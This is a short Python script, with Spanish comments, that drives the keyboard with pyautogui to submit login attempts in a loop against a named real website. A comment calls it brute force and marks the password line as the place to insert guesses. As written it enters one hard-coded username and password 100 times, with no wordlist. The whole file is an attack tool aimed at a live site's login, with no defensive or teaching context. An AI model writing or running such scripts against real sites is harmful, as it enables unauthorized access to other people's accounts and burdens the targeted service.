import pyautogui
import pyperclip
import time

#URL de inicio: https://www.murox.cl/

pyautogui.click() #click para poner como ventana principal a la web (estaba en terminal)

for i in range(0,100):
	for i in range(0,12):
		pyautogui.press('tab')

	pyperclip.copy("userblopez")
	pyautogui.hotkey("ctrl", "v")

	pyautogui.press('tab')

	pyperclip.copy("pass123123123")  #aqui va las pass que quieramos para la fuerza bruta
	pyautogui.hotkey("ctrl", "v")

	pyautogui.press('tab')

	pyautogui.press('enter')

	time.sleep(7)